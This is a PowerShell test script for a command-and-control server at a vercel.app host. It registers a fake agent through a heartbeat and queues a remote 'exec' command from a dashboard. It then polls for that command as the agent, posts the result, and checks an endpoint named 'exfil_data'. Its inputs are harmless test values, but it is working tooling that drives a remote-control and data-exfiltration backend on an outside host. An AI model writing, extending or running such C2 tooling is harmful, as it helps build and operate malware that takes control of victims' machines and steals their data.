$ErrorActionPreference = 'Stop'
[System.Net.ServicePointManager]::Expect100Continue = $false
$C2Url = "https://bom-kaos-kaki.vercel.app"
$TestSessionId = "TEST-AGENT-" + (Get-Random -Minimum 1000 -Maximum 9999)

Write-Host "[1] Sending Heartbeat to register agent..." -ForegroundColor Cyan
$heartbeatPayload = @{
    session_id = $TestSessionId
    hostname = "Test-Machine"
    username = "Test-User"
    os = "Windows 11"
    ip = "127.0.0.1"
    is_admin = $false
    timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
} | ConvertTo-Json -Depth 10

$res = Invoke-WebRequest "$C2Url/api/heartbeat" -Method POST -Body $heartbeatPayload -ContentType "application/json" -UseBasicParsing
if ($res.StatusCode -eq 200) { Write-Host "  -> OK" -ForegroundColor Green } else { throw "Heartbeat failed" }

Write-Host "`n[2] Checking if agent is registered in Dashboard API..." -ForegroundColor Cyan
$res = Invoke-WebRequest "$C2Url/api/dashboard_data" -Method GET -UseBasicParsing
$dashData = $res.Content | ConvertFrom-Json
$agentFound = $dashData.sessions | Where-Object { $_.id -eq $TestSessionId }
if ($agentFound) { Write-Host "  -> OK (Agent Found)" -ForegroundColor Green } else { throw "Agent not found in dashboard" }

Write-Host "`n[3] Dashboard sending 'exec' command to agent..." -ForegroundColor Cyan
$cmdPayload = @{
    target_session = $TestSessionId
    command_type = "exec"
    parameters = @{ script = "Write-Host 'Hello from TDD!'" }
} | ConvertTo-Json -Depth 10
$res = Invoke-WebRequest "$C2Url/api/send_command" -Method POST -Body $cmdPayload -ContentType "application/json" -UseBasicParsing
$sendCmdRes = $res.Content | ConvertFrom-Json
if ($sendCmdRes.success) { Write-Host "  -> OK (Command Queued)" -ForegroundColor Green } else { throw "Send command failed" }

Write-Host "`n[4] Agent polling for commands..." -ForegroundColor Cyan
$res = Invoke-WebRequest "$C2Url/api/get_commands?session_id=$TestSessionId" -Method GET -UseBasicParsing
$cmds = $res.Content | ConvertFrom-Json
$testCmd = $cmds.commands | Where-Object { $_.command_type -eq 'exec' } | Select-Object -First 1
if ($testCmd) { 
    Write-Host "  -> OK (Command Received: $($testCmd.id))" -ForegroundColor Green 
} else { throw "No command received by agent" }

Write-Host "`n[5] Agent executing command and sending result..." -ForegroundColor Cyan
$cmdCompletePayload = @{
    session_id = $TestSessionId
    command_id = $testCmd.id
    command_type = "exec"
    status = "completed"
    result = "Hello from TDD!"
} | ConvertTo-Json -Depth 10
$res = Invoke-WebRequest "$C2Url/api/command_complete" -Method POST -Body $cmdCompletePayload -ContentType "application/json" -UseBasicParsing
$compRes = $res.Content | ConvertFrom-Json
if ($compRes.success) { Write-Host "  -> OK (Result Sent)" -ForegroundColor Green } else { throw "Command complete failed" }

Write-Host "`n[6] Checking if result is in Exfil Data..." -ForegroundColor Cyan
$res = Invoke-WebRequest "$C2Url/api/exfil_data?session_id=$TestSessionId" -Method GET -UseBasicParsing
$exfil = $res.Content | ConvertFrom-Json
$resultFound = $exfil.data | Where-Object { $_.command_id -eq $testCmd.id }
if ($resultFound) { 
    Write-Host "  -> OK (Result verified in database!)" -ForegroundColor Green 
} else { throw "Result not found in database" }

Write-Host "`n==== TDD End-to-End Test Passed Perfectly! ====" -ForegroundColor Green
